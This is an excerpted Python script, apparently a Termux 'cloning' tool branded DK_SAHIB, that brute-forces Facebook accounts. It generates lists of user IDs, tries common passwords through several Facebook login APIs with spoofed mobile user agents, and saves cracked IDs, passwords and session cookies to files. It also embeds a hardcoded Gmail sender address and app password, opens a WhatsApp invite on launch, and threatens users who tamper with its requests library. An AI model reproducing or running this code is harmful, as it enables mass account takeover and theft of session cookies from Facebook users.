...
os.system('xdg-open https://chat.whatsapp.com/BE85IA76jMODS8g2btgQ7L')
try:
...
import ssl,smtplib
email_sender = 'DKSubscription1@gmail.com'
email_password = 'jxgjlutwxmxclkgc'
email_receiver = 'DKSubscription2@gmail.com'
...
logo=("""\033[1;37m 
DDDDDDDDDDDDD       KKKKKKKKK    KKKKKKK
D::::::::::::DDD    K:::::::K    K:::::K
D:::::::::::::::DD  K:::::::K    K:::::K
DDD:::::DDDDD:::::D K:::::::K   K::::::K
  D:::::D    D:::::DKK::::::K  K:::::KKK
...
D:::::::::::::::DD  K:::::::K    K:::::K
D::::::::::::DDD    K:::::::K    K:::::K
DDDDDDDDDDDDD       KKKKKKKKK    KKKKKKK \033[1;32m XD\033[1;37m 
----------------------------------------------
\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •√\033[1;37m  DK_SAHIB
\033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •√\033[1;37m  DK-SAHIB
\033[1;32m•\033[1;37m FRIENDS     \033[1;32m •√\033[1;37m  ALONE
\033[1;32m•\033[1;37m TOOLS       \033[1;32m •√\033[1;37m  FREE
\033[1;32m•\033[1;37m VERSION     \033[1;32m •√\033[1;37m  \033[1;32m0.1\033[1;37m 
------------------------------------------------""")
...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as DK:	
			linex()
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if pcs in ['2','02']:
					passlist = [psx,ids,'200300','afghanistan','Û±Û²Û³Û´ÛµÛ¶Û·Û¸Û¹','khan12345','khan123','500500','Û±Û²Û³Û´ÛµÛ¶']
				elif pcs in ['3','03']:
					...
					passlist = [psx,ids,'57575751','57273200','i love you','iloveyou','59039200','708090']
				if mthd in ['1','01']:
					DK.submit(DK1,ids,passlist)
				if mthd in ['2','02']:
					DK.submit(DK2,ids,passlist)
				if mthd in ['3','03']:
					DK.submit(DK3,ids,passlist)
				if mthd in ['4','04']:
					DK.submit(DK4,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
	...
	clear()
	print('\033[1;37m example: DK, ali, sajjad, faizan\033[1;37m')
	linex()
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [DK-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507224;FBCR/Ooredoo;FBMF/Xiaomi;FBBD/xiaomi;FBDV/MI 5X;FBSV/8.1.0;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [DK-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/DK-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/DK-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[DK-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m\r\r [DK-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/DK-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [HÃ‚MZA-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [DK-OK] '+ids+' | '+pas+'\033[1;97m')
                                        q = po
                                        powerDK = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);DKramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={DKramxan};{powerDK}"
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/DK-COKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/DK-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [DK-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api4(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [HÃMZA-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		...
		for pw in passlist:
			...
			if "checkpoint" in str(ses.cookies.get_dict()):
				print('\r\r\033[1;91m [DK-CP] '+ids+' | '+pas)
				open('/sdcard/DK-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('\r\r\033[1;92m [DK-OK] '+ids+' | '+pas+'\033[1;37m')
				open('/sdcard/DK-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
				open('/sdcard/DK-OK.txt','a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def DK1(ids,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [DK] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			ua = random.choice(ugen)
	...
	for pas in passlist:
		try:
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if uid in str(oks):
					break
				print('\r\r\033[1;32m [DK-OK] '+uid+' | '+pas+'\033[1;37m')
				oks.append(uid)
				open('/sdcard/DK-R-OK.txt','a').write(uid+'|'+pas+'\n')
				break
				...
				try:
					...
					ids = ids
				open('/sdcard/DK-R-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:continue
		except (requests.exceptions.ConnectionError):
...
if not str(len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r').readlines()))=='1034':
	time.sleep(0);print('Final Warning If You Try Again Your System Will be Fucked Bye Mr DK');exit()
